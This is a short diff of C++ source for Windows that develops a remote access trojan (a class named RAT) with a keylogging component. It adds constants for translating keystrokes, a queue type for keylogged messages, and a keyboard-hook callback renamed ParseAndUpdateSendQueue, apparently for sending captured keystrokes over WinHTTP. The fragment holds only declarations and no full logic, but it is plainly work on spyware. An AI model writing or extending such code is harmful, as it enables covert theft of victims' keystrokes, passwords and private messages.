@@ -3,6 +3,7 @@
 #include <Windows.h>
 #include <winhttp.h>
 #include <iostream>
+#include <queue>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -24,6 +25,8 @@ namespace HTTPInfo {
 
 namespace Keylogging {
 	constexpr int ALL_THREADS = 0;
+	constexpr int MAX_LENGTH_OF_TRANSLATED_MESSAGE = 10; // Can be changed, seems more than enough,
+	constexpr int TRANSLATE_KEY_BREAK_SCAN_CODES = 1;
 }
 
 struct HINTERNETDeleter {
@@ -37,8 +40,9 @@ struct HINTERNETDeleter {
 };
 
 using HINTERNETWrapper = std::unique_ptr<HINTERNET, HINTERNETDeleter>;
+using KeyloggedMessageQueue = std::wstring;
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+LRESULT CALLBACK ParseAndUpdateSendQueue(int nCode, WPARAM wParam, LPARAM lParam);
 
 class RAT {
 public:
